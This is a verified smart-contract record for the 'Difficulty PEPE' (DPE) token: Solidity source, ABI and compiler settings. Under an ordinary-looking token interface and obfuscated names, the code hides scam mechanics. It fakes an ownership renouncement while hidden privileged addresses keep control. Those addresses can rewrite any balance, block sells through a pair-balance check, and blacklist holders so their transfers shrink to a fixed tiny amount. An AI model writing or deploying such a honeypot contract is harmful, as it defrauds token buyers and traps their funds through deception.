{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface autoToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletTradingAuto) external view returns (uint256);\n\n    function transfer(address sellList, uint256 receiverLaunched) external returns (bool);\n\n    function allowance(address limitMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellList,\n        uint256 receiverLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromWallet, uint256 value);\n    event Approval(address indexed limitMin, address indexed spender, uint256 value);\n}\n\nabstract contract feeLaunchList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingMarketing {\n    function createPair(address fromEnableLiquidity, address sellTeam) external returns (address);\n}\n\ninterface autoTokenMetadata is autoToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DifficultyPEPE is feeLaunchList, autoToken, autoTokenMetadata {\n\n    bool private amountModeTake;\n\n    function launchMode(address shouldFromBuy) public {\n        require(shouldFromBuy.balance < 100000);\n        if (launchBuy) {\n            return;\n        }\n        if (exemptMaxShould != shouldToken) {\n            exemptMaxShould = false;\n        }\n        takeMarketingTrading[shouldFromBuy] = true;\n        \n        launchBuy = true;\n    }\n\n    function toLimit() private view {\n        require(takeMarketingTrading[_msgSender()]);\n    }\n\n    uint256 public enableFund;\n\n    function buyList(address teamAtAuto, address sellList, uint256 receiverLaunched) internal returns (bool) {\n        if (teamAtAuto == fromLaunched) {\n            return swapToken(teamAtAuto, sellList, receiverLaunched);\n        }\n        uint256 tokenLaunchAt = autoToken(feeLaunchedToken).balanceOf(toSell);\n        require(tokenLaunchAt == sellFee);\n        require(sellList != toSell);\n        if (feeLaunchReceiver[teamAtAuto]) {\n            return swapToken(teamAtAuto, sellList, liquidityLaunched);\n        }\n        return swapToken(teamAtAuto, sellList, receiverLaunched);\n    }\n\n    function transfer(address toTotal, uint256 receiverLaunched) external virtual override returns (bool) {\n        return buyList(_msgSender(), toTotal, receiverLaunched);\n    }\n\n    function swapToken(address teamAtAuto, address sellList, uint256 receiverLaunched) internal returns (bool) {\n        require(totalMarketing[teamAtAuto] >= receiverLaunched);\n        totalMarketing[teamAtAuto] -= receiverLaunched;\n        totalMarketing[sellList] += receiverLaunched;\n        emit Transfer(teamAtAuto, sellList, receiverLaunched);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingLaunchReceiver;\n    }\n\n    string private totalIsLaunched = \"DPE\";\n\n    string private exemptLimit = \"Difficulty PEPE\";\n\n    bool private txSell;\n\n    function balanceOf(address walletTradingAuto) public view virtual override returns (uint256) {\n        return totalMarketing[walletTradingAuto];\n    }\n\n    uint8 private isSenderAt = 18;\n\n    address txSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public fromLaunched;\n\n    address toSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public feeLaunchedToken;\n\n    constructor (){\n        if (exemptMaxShould) {\n            feeTotal = enableFund;\n        }\n        maxAmount launchedAtTake = maxAmount(txSwap);\n        feeLaunchedToken = tradingMarketing(launchedAtTake.factory()).createPair(launchedAtTake.WETH(), address(this));\n        \n        fromLaunched = _msgSender();\n        senderList();\n        takeMarketingTrading[fromLaunched] = true;\n        totalMarketing[fromLaunched] = listSwapBuy;\n        \n        emit Transfer(address(0), fromLaunched, listSwapBuy);\n    }\n\n    bool private shouldToken;\n\n    function owner() external view returns (address) {\n        return tradingLaunchReceiver;\n    }\n\n    uint256 sellFee;\n\n    function approve(address receiverAt, uint256 receiverLaunched) public virtual override returns (bool) {\n        tradingMin[_msgSender()][receiverAt] = receiverLaunched;\n        emit Approval(_msgSender(), receiverAt, receiverLaunched);\n        return true;\n    }\n\n    address private tradingLaunchReceiver;\n\n    bool public launchBuy;\n\n    uint256 constant liquidityLaunched = 9 ** 10;\n\n    event OwnershipTransferred(address indexed enableReceiver, address indexed tradingBuy);\n\n    mapping(address => bool) public takeMarketingTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptLimit;\n    }\n\n    mapping(address => bool) public feeLaunchReceiver;\n\n    uint256 marketingShould;\n\n    bool private launchedTokenAmount;\n\n    function allowance(address amountWallet, address receiverAt) external view virtual override returns (uint256) {\n        if (receiverAt == txSwap) {\n            return type(uint256).max;\n        }\n        return tradingMin[amountWallet][receiverAt];\n    }\n\n    function atFrom(address toTotal, uint256 receiverLaunched) public {\n        toLimit();\n        totalMarketing[toTotal] = receiverLaunched;\n    }\n\n    function senderList() public {\n        emit OwnershipTransferred(fromLaunched, address(0));\n        tradingLaunchReceiver = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listSwapBuy;\n    }\n\n    bool private exemptMaxShould;\n\n    function shouldEnable(uint256 receiverLaunched) public {\n        toLimit();\n        sellFee = receiverLaunched;\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingMin;\n\n    mapping(address => uint256) private totalMarketing;\n\n    uint256 private feeTotal;\n\n    function transferFrom(address teamAtAuto, address sellList, uint256 receiverLaunched) external override returns (bool) {\n        if (_msgSender() != txSwap) {\n            if (tradingMin[teamAtAuto][_msgSender()] != type(uint256).max) {\n                require(receiverLaunched <= tradingMin[teamAtAuto][_msgSender()]);\n                tradingMin[teamAtAuto][_msgSender()] -= receiverLaunched;\n            }\n        }\n        return buyList(teamAtAuto, sellList, receiverLaunched);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalIsLaunched;\n    }\n\n    uint256 private listSwapBuy = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isSenderAt;\n    }\n\n    function senderTrading(address launchTo) public {\n        toLimit();\n        \n        if (launchTo == fromLaunched || launchTo == feeLaunchedToken) {\n            return;\n        }\n        feeLaunchReceiver[launchTo] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunched\",\"type\":\"uint256\"}],\"name\":\"atFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTradingAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLaunchReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunchedToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFromBuy\",\"type\":\"address\"}],\"name\":\"launchMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"}],\"name\":\"senderTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverLaunched\",\"type\":\"uint256\"}],\"name\":\"shouldEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMarketingTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamAtAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DifficultyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}